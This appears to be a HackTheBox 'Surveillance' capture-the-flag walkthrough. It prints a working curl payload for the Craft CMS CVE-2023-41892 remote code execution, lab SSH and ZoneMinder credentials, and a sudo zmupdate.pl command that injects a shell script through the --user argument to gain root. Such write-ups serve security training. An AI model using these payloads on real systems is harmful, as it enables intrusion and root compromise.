The box just has a SSH and HTTP port
inside the website the htaccess is downloadable and there is a login page

The login and htaccess talk about something called Craft CMS
Down inside the footer of the website with, digging it up we can find the
version of craftcms.
SURVEILLANCE.HTB</a><br> <b>Powered by <a href="https://github.com/craftcms/cms/tree/4.4.14"/>Craft CMS</a></b>

Version ==> Craft CMS 4.4.14

Subdomain enumeration didnt find anything

After trying to find a good exploit, we tried password reset hijacking BUT,
there is a recent cve that works perfectly.

CVE-2023-41892 - Craft CMS Remote Code Execution (RCE)

curl -sk "http://surveillance.htb/index.php" -X POST -d 'action=conditions/render&test[userCondition]=craft\elements\conditions\users\UserCondition&config={"name":"test[userCondition]","as xyz":{"class":"\\GuzzleHttp\\Psr7\\FnStream","__construct()":[{"close":null}],"_fn_close":"phpinfo"}}' --proxy 127.0.0.1:8080

https://github.com/zaenhaxor/CVE-2023-41892 --> source
Converted a curl cmd shown inside a github repo so we can use it.
The cmd in the repo simply runs phpinfo(), but with RCE we may be able to get us a shell!

============================================


After getting a shell we have to dig around and find important items,
a backup file seems to have a credential from a db.
It was a simple MD5 hash.

matthew:starcraft122490 ==> SSH Cred!
=======================================================

Inside of linpeas.out we can see db creds.
'datasource' => 'Database/Mysql',
'persistent' => false,
'host' => 'localhost',
'login' => 'zmuser',
'password' => 'ZoneMinderPassword2023',
'database' => 'zm'

The hash doesnt crack, but with a password spray of known passwords matthew is
also the admin user on zm.

ZM Version v1.36.32

the `sudo /usr/bin/zmupdate.pl` command when you watch outputs is running a mysqldump, but the user and password are injectable to code breaks. We can add escapes to run our own bash code under root and gain a root shell!

sudo /usr/bin/zmupdate.pl --version=1 --user='; bash /tmp/shell.sh; echo
